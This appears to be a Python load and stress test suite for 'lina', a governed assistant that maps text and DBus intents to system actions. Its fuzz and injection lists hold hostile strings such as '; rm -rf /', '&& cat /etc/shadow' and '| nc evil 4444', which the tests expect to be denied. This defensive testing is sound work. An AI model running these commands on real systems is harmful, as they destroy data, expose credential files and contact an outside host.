"""
Phase 7 — Block B: Load & Stress Testing.

Validates system behavior under high-frequency inputs:
  - 1000+ rapid intents (CLI and DBus mixed)
  - High-frequency denial attempts
  - High-frequency fuzz inputs
  - Confirmation storm

Success criteria:
  • No deadlock
  • No race conditions
  • Audit integrity preserved
  • Rate handling stable
  • No degraded policy enforcement

Run: python tests/phase7/test_load_stress.py
"""

import gc
import os
import sys
import time
import random
import threading
import unittest
from unittest.mock import MagicMock, patch
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))


def _reset_singletons():
    modules = [
        ("lina.intent.bridge", "_bridge"),
        ("lina.intent.router", "_router"),
        ("lina.governance.policy_engine", "_engine"),
        ("lina.governance.action_registry", "_registry"),
        ("lina.governance.audit_logger", "_logger"),
        ("lina.governance.escalation", "_manager"),
        ("lina.governance.confirmation", "_handler"),
        ("lina.access.resolver", "_resolver"),
        ("lina.security.input_validator", "_validator"),
    ]
    for mod_name, attr in modules:
        try:
            mod = sys.modules.get(mod_name)
            if mod and hasattr(mod, attr):
                setattr(mod, attr, None)
        except Exception:
            pass


FUZZ_INPUTS = [
    "", " ", "\t\n", "x" * 5000, "\x00" * 10, "\x01\x02\x03",
    "A" * 4097, "test\x00null", "$(whoami)", "`id`",
    "; rm -rf /", "&& cat /etc/passwd", "| nc evil 4444",
    "echo aGVsbG8= | base64 -d", "\\x41\\x42\\x43",
    "eval('os.system(\"rm -rf /\")')", "python -c 'import os'",
    "\ud800", "test\r\nHeader: evil", "<!--", "<script>",
    "' OR 1=1 --", "{{7*7}}", "${7*7}", "%s%s%s%s",
    "AAAA%08x.%08x", "../../../etc/shadow",
    "NUL", "CON", "PRN",
    "привет" * 500, "🎉" * 1000,
    '{"key": "val"}', '<xml>test</xml>',
]


# ═══════════════════════════════════════════════════════════════
#  Block B.1 — Burst Input Test (1000+ rapid intents)
# ═══════════════════════════════════════════════════════════════

class TestBurstInput(unittest.TestCase):
    """B.1: 1000+ rapid intents без deadlock и crash."""

    def setUp(self):
        _reset_singletons()

    def tearDown(self):
        _reset_singletons()

    @patch("lina.governance.action_registry.subprocess.run")
    def test_1000_rapid_intents_sequential(self, mock_run):
        """1000 последовательных intent за минимальное время."""
        mock_run.return_value = MagicMock(returncode=0, stdout="OK", stderr="")

        from lina.intent.bridge import get_intent_bridge
        from lina.intent.types import IntentStatus

        bridge = get_intent_bridge()
        valid_statuses = set(IntentStatus)
        errors = []

        start = time.monotonic()
        for i in range(1000):
            try:
                text = random.choice(["привет", "статус", "перезапусти cups", "; evil"])
                result = bridge.from_text(text, source=random.choice(["cli", "ui"]))
                if result.status not in valid_statuses:
                    errors.append(f"iter {i}: invalid status {result.status}")
            except Exception as e:
                errors.append(f"iter {i}: {type(e).__name__}: {e}")
        elapsed = time.monotonic() - start

        self.assertEqual(len(errors), 0, f"Errors in burst:\n" + "\n".join(errors[:10]))
        self.assertLess(elapsed, 30.0, f"Burst took too long: {elapsed:.1f}s")

    @patch("lina.governance.action_registry.subprocess.run")
    def test_1000_rapid_actions_sequential(self, mock_run):
        """1000 прямых action-вызовов."""
        mock_run.return_value = MagicMock(returncode=0, stdout="OK", stderr="")

        from lina.intent.bridge import get_intent_bridge

        bridge = get_intent_bridge()
        errors = []

        for i in range(1000):
            try:
                result = bridge.from_action(
                    action_id="svc_status",
                    domain="service",
                    source="cli",
                    params={"service_name": "NetworkManager"},
                )
                self.assertIsNotNone(result)
            except Exception as e:
                errors.append(f"iter {i}: {e}")

        self.assertEqual(len(errors), 0, f"Errors:\n" + "\n".join(errors[:10]))


# ═══════════════════════════════════════════════════════════════
#  Block B.2 — High-Frequency Denial Attempts
# ═══════════════════════════════════════════════════════════════

class TestHighFrequencyDenials(unittest.TestCase):
    """B.2: Массовые попытки инъекции — все отклонены."""

    def setUp(self):
        _reset_singletons()

    def tearDown(self):
        _reset_singletons()

    def test_500_injection_attempts(self):
        """500 инъекционных попыток — 100% DENY, 0% bypass."""
        from lina.intent.bridge import get_intent_bridge
        from lina.intent.types import IntentStatus

        bridge = get_intent_bridge()
        injections = [
            "; rm -rf /", "&& cat /etc/shadow", "| nc evil 4444",
            "$(reboot)", "`shutdown now`", "echo test > /etc/passwd",
            "test\x00null", "x" * 5000,
        ]

        blocked = 0
        bypassed = 0

        for i in range(500):
            text = random.choice(injections)
            result = bridge.from_text(text, source="cli")
            if result.status == IntentStatus.SUCCESS:
                bypassed += 1
            else:
                # DENIED, NEEDS_CONFIRM, CHAT_RESPONSE, FAILED, NOT_FOUND — all acceptable
                blocked += 1

        self.assertEqual(bypassed, 0, f"CRITICAL: {bypassed}/500 injection attempts executed!")

    def test_500_invalid_sources(self):
        """500 вызовов с недопустимыми sources — все DENY."""
        from lina.intent.bridge import get_intent_bridge
        from lina.intent.types import IntentStatus

        bridge = get_intent_bridge()
        denied = 0

        for _ in range(500):
            result = bridge.from_text("привет", source="hacker")
            if result.status == IntentStatus.DENIED:
                denied += 1

        self.assertEqual(denied, 500)


# ═══════════════════════════════════════════════════════════════
#  Block B.3 — High-Frequency Fuzz
# ═══════════════════════════════════════════════════════════════

class TestHighFrequencyFuzz(unittest.TestCase):
    """B.3: Массовый фаззинг — система не падает."""

    def setUp(self):
        _reset_singletons()

    def tearDown(self):
        _reset_singletons()

    def test_2000_fuzz_inputs(self):
        """2000 случайных fuzz-входов без crash."""
        from lina.intent.bridge import get_intent_bridge

        bridge = get_intent_bridge()
        crashes = 0
        total = 2000

        for i in range(total):
            text = random.choice(FUZZ_INPUTS)
            try:
                result = bridge.from_text(text, source="cli")
                self.assertIsNotNone(result, f"None result for input #{i}")
            except Exception:
                crashes += 1

        self.assertEqual(crashes, 0, f"{crashes}/{total} fuzz inputs caused crashes")

    def test_fuzz_domains(self):
        """500 случайных доменов — InputValidator стабилен."""
        from lina.security.input_validator import get_input_validator

        iv = get_input_validator()
        for i in range(500):
            domain = random.choice([
                "valid", "", "x" * 100, "../etc", "\x00", "evil!",
                "service", "a" * 65, "\t\n", "网络"
            ])
            try:
                ok, reason = iv.validate_domain(domain)
                self.assertIsInstance(ok, bool)
            except Exception as e:
                self.fail(f"Crash on domain #{i} ({domain!r}): {e}")

    def test_fuzz_params(self):
        """500 случайных params — InputValidator стабилен."""
        from lina.security.input_validator import get_input_validator

        iv = get_input_validator()
        fuzz_params = [
            {}, {"k": "v"}, {"a": {"b": {"c": {"d": {"e": "deep"}}}}},
            {"k" * 100: "v"}, {i: i for i in range(50)},
            {"key": "\x00null"}, {"key": "x" * 2000},
            {"key": [1, 2, [3, [4, [5]]]]}, None, "not_a_dict", 42,
        ]

        for i, p in enumerate(fuzz_params * 50):
            try:
                ok, reason = iv.validate_params(p)
                self.assertIsInstance(ok, bool)
            except Exception as e:
                self.fail(f"Crash on params #{i}: {e}")


# ═══════════════════════════════════════════════════════════════
#  Block B.4 — Confirmation Storm
# ═══════════════════════════════════════════════════════════════

class TestConfirmationStorm(unittest.TestCase):
    """B.4: Множественные одновременные confirmation flows."""

    def setUp(self):
        _reset_singletons()

    def tearDown(self):
        _reset_singletons()

    def test_100_escalations_no_id_collision(self):
        """100 одновременных эскалаций — нет коллизий ID."""
        from lina.governance.escalation import get_escalation_manager

        em = get_escalation_manager()
        ids = set()

        for i in range(100):
            esc = em.create_escalation(
                level="confirm",
                title=f"Test {i}",
                title_ru=f"Тест {i}",
                description=f"Test escalation {i}",
                description_ru=f"Тестовая эскалация {i}",
                domain="service",
                risk_level="medium",
                proposed_action="svc_restart",
                proposed_command=f"systemctl restart test_{i}",
            )
            self.assertNotIn(esc.id, ids, f"ID collision at escalation {i}: {esc.id}")
            ids.add(esc.id)

        self.assertEqual(len(ids), 100)

    def test_rapid_create_resolve(self):
        """200 create + resolve cycles — no corrupt state."""
        from lina.governance.escalation import get_escalation_manager

        em = get_escalation_manager()

        for i in range(200):
            esc = em.create_escalation(
                level="confirm",
                title=f"Rapid {i}",
                title_ru=f"Быстрый {i}",
                description="test",
                description_ru="тест",
                domain="service",
                risk_level="low",
                proposed_action="svc_status",
                proposed_command="systemctl status test",
            )
            # Alternate: confirm half, deny half
            confirmed = (i % 2 == 0)
            resolved = em.resolve(esc.id, confirmed=confirmed)
            self.assertTrue(resolved, f"Failed to resolve escalation {i}")

        # After storm, pending should be 0
        pending = em.get_pending_count()
        self.assertEqual(pending, 0, f"Leaked pending: {pending}")


# ═══════════════════════════════════════════════════════════════
#  Block B.5 — Rate Limit Under Stress
# ═══════════════════════════════════════════════════════════════

class TestRateLimitStress(unittest.TestCase):
    """B.5: Rate limiting стабилен под нагрузкой."""

    def setUp(self):
        _reset_singletons()

    def tearDown(self):
        _reset_singletons()

    def test_rate_limiter_stability(self):
        """PolicyEngine rate limiter: 100 rapid checks."""
        from lina.governance.policy_engine import get_policy_engine

        pe = get_policy_engine()
        results = {"allow": 0, "deny": 0, "confirm": 0, "rate_limited": 0}

        for i in range(100):
            result = pe.check(
                "svc_status",
                domain="service",
                risk_level="low",
            )
            d = result.decision.value if hasattr(result.decision, 'value') else str(result.decision)
            results[d] = results.get(d, 0) + 1

        # System should not crash, and should enforce rate limits if triggered
        total = sum(results.values())
        self.assertEqual(total, 100, f"Lost checks: {results}")


# ── Entry Point ──────────────────────────────────────────────

_total = _pass = _fail = 0

def _run_suite(suite_class):
    global _total, _pass, _fail
    loader = unittest.TestLoader()
    suite = loader.loadTestsFromTestCase(suite_class)
    runner = unittest.TextTestRunner(verbosity=2, stream=sys.stderr)
    result = runner.run(suite)
    _total += result.testsRun
    _pass += result.testsRun - len(result.failures) - len(result.errors)
    _fail += len(result.failures) + len(result.errors)
    return result

if __name__ == "__main__":
    suites = [
        TestBurstInput,
        TestHighFrequencyDenials,
        TestHighFrequencyFuzz,
        TestConfirmationStorm,
        TestRateLimitStress,
    ]
    all_ok = True
    for s in suites:
        r = _run_suite(s)
        if not r.wasSuccessful():
            all_ok = False

    print(f"\n{'='*60}")
    print(f"Phase 7 Block B — Load & Stress: {_pass}/{_total} passed, {_fail} failed")
    if all_ok:
        print("✅ LOAD & STRESS TEST PASSED")
    else:
        print("❌ LOAD & STRESS TEST FAILED")
    sys.exit(0 if all_ok else 1)
